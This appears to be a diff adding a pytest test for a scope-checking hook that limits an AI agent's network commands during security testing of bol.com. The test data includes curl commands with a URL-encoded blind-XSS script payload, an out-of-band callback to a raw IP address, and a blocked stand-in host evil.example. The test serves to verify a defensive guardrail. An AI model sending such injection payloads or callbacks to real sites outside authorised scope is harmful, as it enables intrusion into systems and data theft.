@@ -105,3 +105,24 @@ def test_hook_process_protocol(tmp_path, scope):
     target_fetch = call("WebFetch", {"url": "https://www.bol.com/", "prompt": "x"})
     assert target_fetch.returncode == 2 and "scope proxy" in target_fetch.stderr
     assert len((tmp_path / "hook.log").read_text().splitlines()) == 2  # google + target fetch
+
+
+def test_operator_oob_hosts_are_allowed_in_payloads(scope):
+    """The researcher's OOB server and blind-XSS collector (passed as extra
+    hosts) are allowed as destinations and inside payloads; other external
+    hosts are still blocked as destinations."""
+    extra = ("38.242.235.206", "xss.report")
+    # OOB/blind-xss URL nested in a payload sent to an in-scope target: fine
+    # (the request goes to the target).
+    check_command("curl 'https://api.bol.com/?u=http://38.242.235.206:8080/tok1'", scope, PROTECTED, extra)
+    check_command("curl 'https://www.bol.com/?x=%3Cscript%20src=https://xss.report/c/abdalah336%3E'",
+                  scope, PROTECTED, extra)
+    # The OOB host as a direct destination is allowed (it is the operator's own).
+    check_command("curl -s http://38.242.235.206:8080/tok1", scope, PROTECTED, extra)
+    check_command("curl -s https://xss.report/c/abdalah336", scope, PROTECTED, extra)
+    # A different external host as a destination is still blocked.
+    with pytest.raises(Verdict):
+        check_command("curl -s http://evil.example/", scope, PROTECTED, extra)
+    # And without the extra-hosts allowlist, the OOB host would be blocked.
+    with pytest.raises(Verdict):
+        check_command("curl -s http://38.242.235.206:8080/", scope, PROTECTED)
